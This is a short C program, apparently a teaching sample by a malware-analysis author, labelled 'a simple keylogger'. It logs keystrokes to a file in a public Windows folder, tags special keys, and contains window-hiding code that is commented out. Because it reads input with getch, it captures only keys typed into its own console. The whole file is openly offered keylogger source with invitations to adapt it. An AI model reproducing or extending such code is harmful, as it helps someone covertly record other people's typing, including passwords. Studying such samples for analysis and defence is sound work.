// Author: Josh Stroschein @jstrosch
// Date: 22 December 2021
// Description: A simple keylogger. 
// Credits: I'm sure there is code borrowed here from other projects but I failed to initially document - if you recognize something, please let me know.

#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>

#pragma comment(lib,"user32.lib")

#define PATH "C:\\Users\\Public\\test-log.txt" // The path to the log file

int main(){
    char capture;
    FILE *file;

    // Time stuff.
    time_t t;
    t = time(NULL);
    // Hide the window
    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    //ShowWindow(window,0);

    file = fopen(PATH, "a+");

    while(1)
    {
        Sleep(20); // To make sure this program doesn't steal all resources.
        if (_kbhit())
        {
            capture = getch();
            // Just add in some helper strings here to the file, feel free to modify these to your needs.
            switch ((int)capture){
                case ' ': // Space key...obviously.
                    fprintf(file, " ");
                    break;
                case 0x09: // Tab key.
                    fprintf(file, "[TAB]");
                    break;
                case 0x0D: // Enter key.
                    fprintf(file, "[ENTER]");
                    break;
                case 0x1B: // Escape key.
                    fprintf(file, "[ESC]");
                    break;
                case 0x08: // Backspace key.
                    fprintf(file, "[BACKSPACE]");
                    break;
                default:
                    fputc(capture,file); // Put any other inputted key into the file.
            }

            if ( (int) capture == 27 ){  // The escape key. You can change this to anything you want.
                fclose(file);
                return 0;
            }
        }
    }
}
